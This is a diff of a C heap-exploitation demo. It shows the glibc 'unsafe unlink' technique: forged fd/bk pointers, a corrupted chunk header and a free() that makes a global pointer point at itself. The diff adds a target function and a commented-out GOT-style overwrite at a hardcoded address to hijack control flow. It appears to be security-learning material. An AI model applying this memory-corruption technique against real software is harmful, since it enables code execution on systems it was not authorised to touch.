@@ -10,18 +10,25 @@
 
 uint64_t *chunk0_ptr;
 
+void babo()
+{
+    printf("%s!\n", "Babo");
+}
+
 int main()
 {
     int malloc_size = 0x80;
     int header_size = 2;
 
     chunk0_ptr = (uint64_t*) malloc(malloc_size);
-
     uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size);
 
-    chunk0_ptr[2] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*3);
-    chunk0_ptr[3] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*2);
+    printf("&chunk0_ptr: %p\n", &chunk0_ptr);
+    printf("chunk0_ptr: %p\n", chunk0_ptr);
+
     chunk0_ptr[1] = sizeof(size_t);
+    chunk0_ptr[2] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*3); // fd
+    chunk0_ptr[3] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*2); // bk
 
     uint64_t *chunk1_hdr = chunk1_ptr - header_size;
     chunk1_hdr[0] = malloc_size;
@@ -29,15 +36,11 @@ int main()
 
     free(chunk1_ptr);
     
-    char v[8];
-    strcpy(v, "Hello!~");
-    chunk0_ptr[3] = (uint64_t) v;
+    printf("chunk0_ptr: %p\n", chunk0_ptr);
 
-    printf("Original value: %s\n", v);
+    //*(uint64_t*)0x601020 = (uint64_t)babo;
 
-    chunk0_ptr[0] = 0x4141414142424242LL;
-
-    printf("New value: %s\n", v);
+    puts("Done.");
 
     return 0;
 }
